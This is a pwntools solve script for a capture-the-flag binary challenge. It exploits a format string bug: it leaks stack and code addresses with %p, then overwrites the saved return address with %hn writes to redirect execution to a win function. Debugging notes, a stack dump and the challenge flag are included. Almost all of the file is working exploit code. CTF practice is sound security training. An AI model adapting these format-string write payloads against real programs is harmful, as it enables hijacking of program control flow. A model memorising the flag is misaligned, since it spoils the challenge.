#!/usr/bin/env python3

from pwn import *

exe = ELF("./intro_patched", checksec=False)

elf = context.binary = exe

gs = """
break main
b *main+307
continue
"""

# run with python3 solve.py REMOTE
if args.REMOTE:
    p = remote("chals.cyberjousting.com", 1367)

# run with python3 solve.py GDB
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(exe.path, gdbscript=gs)

# run with python3 solve.py
else:
    p = elf.process([exe.path][1:])


### START HERE ###

# offset of main function address is %39$p

p.recvuntil(b': ')
p.sendline(b'%39$p')
leak = int(p.recvline().lstrip(b'Incorrect flag: ').rstrip(b'. Try again.\n').decode(), 0)
print(hex(leak))

p.recvuntil(b': ')
p.sendline(b'%37$p') # 32 on local
leak2 = int(p.recvline().lstrip(b'Incorrect flag: ').rstrip(b'. Try again.\n').decode(), 0)
print(hex(leak2))

# ret = leak2-40
ret = leak2-288
print(f'Guessed stack address of the return: {hex(ret)}')
win = leak-0x8c
print(f"Win address: {hex(win)}")

# def send_payload(payload):
#         print(payload)
#         p.sendlineafter(b': ', payload)
#         return p.recv()

# # # Create a FmtStr object and give to him the function
# format_string = FmtStr(execute_fmt=send_payload)
# format_string.write(ret, win) # write 0x1337babe at 0x0
# format_string.execute_writes()

print((win>>16)&0xffff)
print((win&0xffff))
win2 = (0x10000 + ((win>>16)&0xffff)) - (win&0xffff)
print(win2)
# quit()

exploit = flat(
    f'%4${(win&0xffff)}c'.encode(), # lsb of win 
    b'%24$hn',
    f'%4${win2}c'.encode(), # 
    b'%25$hn'
)

exploit += b'A' * (8 - len(exploit)%8)

# print(len(exploit)); quit()

exploit = exploit + p64(ret) + p64(ret+2)

print(exploit)
# print(len(exploit) % 8)
# quit()

p.sendlineafter(b': ', exploit)

win3 = (win>>32)&0xffff
exploit2 = flat(
    f'%4${win3}c'.encode(), # lsb of win 
    b'%22$hn'
)
# print(hex(win3)); quit    ()
exploit2 += b'A' * (8 - len(exploit2)%8)
exploit2 = exploit2 + p64(ret+4)

p.sendlineafter(b': ', exploit2)

p.recvuntil(b': ')
p.sendline(b'A')

p.interactive()


# %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
# %10$p.%11$p.%12$p.%13$p.%14$p.
# %15$p.%16$p.%17$p.%18$p.%19$p
# %20$p.%21$p.%22$%p.%23$p.%24$p.
# %25$p.%26$p.%27$p.%28$p.%29$p
# %30$p.%31$p.%32$%p.%33$p.%34$p.
# %35$p.%36$p.%37$p.%38$p.%39$p

# %39$p%                                                                                                                                                                                                                                                                                       ~/ctf/adventofcode ❯                                                                                                                                                                                                                                                             ctf 15:22:10

"""
And this is what that stack frame looks like:
0x7fffffffc830: 0x31252e7024353125      0x243731252e702436
0x7fffffffc840: 0x2e70243831252e70      0x0000007024393125
0x7fffffffc850: 0x000000ba00000006      0x0000000000000000
0x7fffffffc860: 0x0000000000000000      0x0000000000000000
0x7fffffffc870: 0x0000000000000000      0x0000000000000000
0x7fffffffc880: 0x0000000000000000      0x00007ffff7f8c4e0
0x7fffffffc890: 0x00007fffffffc8d0      0x00000001f7e0ebf1
0x7fffffffc8a0: 0x00007fffffffc940      0x00007ffff7da6575
0x7fffffffc8b0: 0x00007ffff7fc7000      0x00007fffffffc9c8
0x7fffffffc8c0: 0x0000000100000000      0x00005555555545c9

where 0x7fffffffc8a8 is the return address

our input starts at %20$p

 
0x7ffff7da6575.0x7ffff7fc7000.0x7fffffffc9c8.0x100000000.0x5555555545c90x0000555555554780
"""

# byuctf{%p_yourself}